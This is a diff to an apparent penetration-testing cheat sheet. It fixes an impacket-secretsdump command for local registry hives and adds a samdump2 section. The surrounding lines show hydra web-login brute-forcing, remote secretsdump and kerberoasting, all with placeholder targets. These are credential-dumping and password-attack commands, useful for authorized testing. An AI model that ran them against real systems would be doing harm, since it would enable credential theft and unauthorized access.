@@ -1315,7 +1315,7 @@ hydra l user_name_here -p /path/to/wordlist url_here http-form-post "/path/to/lo
 /path/to/impacket-secretsdump -dc-ip IP_here user:password@IP_here
 
 # dump hashes from SYSTEM, SAM, SECURITY registry files
-/path/to/impacket-secretsdump -sam /path/to/copy/of/sam -system /path/to/copy/of/system -security /path/to/copy/of/security
+/path/to/impacket-secretsdump -sam /path/to/copy/of/sam -system /path/to/copy/of/system -security /path/to/copy/of/security LOCAL
 
 # kerberoasting : gather NTLM hashes
 /path/to/impacket/examples/GetUserSPNs.py -request -dc-ip IP_here domain/user
@@ -2305,6 +2305,14 @@ ruby -run -e httpd -p port_here
 ```bash
 # show logged in users
 rusers -l IP_here
+```
+
+
+
+## SAMDUMP2
+```bash
+# dump hashes from SYSTEM + SAM
+samdump2 /path/to/copy/of/system /path/to/copy/of/sam
 ```
 
 
